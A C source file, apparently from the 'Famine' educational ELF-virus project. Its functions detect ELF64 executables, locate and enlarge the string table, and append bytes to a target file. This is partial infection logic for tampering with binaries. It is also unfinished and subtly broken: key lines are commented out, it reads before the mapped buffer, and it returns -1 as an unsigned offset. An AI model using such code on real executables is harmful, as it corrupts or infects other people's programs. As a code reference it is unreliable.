#include "../inc/famine.h"


size_t add_str_to_strtab(const char *s, int fd, void *mem, size_t filesize)
{
    Elf64_Off strtab_offset;

    (void)mem;
    strtab_offset = find_strtab(mem, filesize);
    (void)strtab_offset;
    (void)fd;
    lseek(fd, 0, SEEK_END);
    write(fd, mem - STRLEN, STRLEN);
    // memmove(mem + strtab_offset + STRLEN, mem + strtab_offset, filesize - strtab_offset - STRLEN);
    // memcpy(mem + strtab_offset, FAMINE, STRLEN);
    // *(char*)(mem + strtab_offset + STRLEN) = 0;
    return (filesize + ft_strlen(s));
    
}

/**
 * @brief find strtab index section
 * 
 * @param mem mmap'd pointer
 * @param filesize size of the executable
 * @return Elf64_Section index of strtab section in the file or -1 if not found
 */
Elf64_Off find_strtab(void *mem, size_t filesize)
{
    Elf64_Ehdr *hdr = mem;
    Elf64_Shdr *shdr = mem + hdr->e_shoff;

    if (hdr->e_shoff + shdr->sh_entsize * hdr->e_shnum > filesize)
    {
        debug("%s", "size overflow: corrupted file");
        return(-1);
    }
    for (uint i = 0; i < hdr->e_shnum; ++i)
    {
        if (shdr[i].sh_type == SHT_STRTAB)
        {
            debug("%s%ld", "strtab section size ", shdr[i].sh_size);
            debug("%s %u", "found strtab at index", i);
            shdr[i].sh_size += STRLEN + 1;
            return (shdr[i].sh_offset + shdr[i].sh_size + 1);
        }
    }
    return (-1);
}

/**
 * @brief checks if a mmapped address corresponds to an elf 64 executable
 * 
 * @param mem 
 * @param size 
 * @return 1 if true, 0 if false
 */
int is_elf_64(void *mem, size_t size)
{
    Elf64_Ehdr *hdr;
    
    if (!mem)
        return (0);
    if (size <= sizeof(*hdr))
        return (0);
    hdr = mem;
    if (size <= hdr->e_shoff + hdr->e_shnum * sizeof(hdr->e_shentsize))
        return (0);
    if (ft_strncmp((char *)hdr->e_ident, ELFMAG, ft_strlen(ELFMAG)) != 0)
        return (0);
    if (hdr->e_ident[EI_CLASS] != ELFCLASS64)
        return (0);
    return (1);
}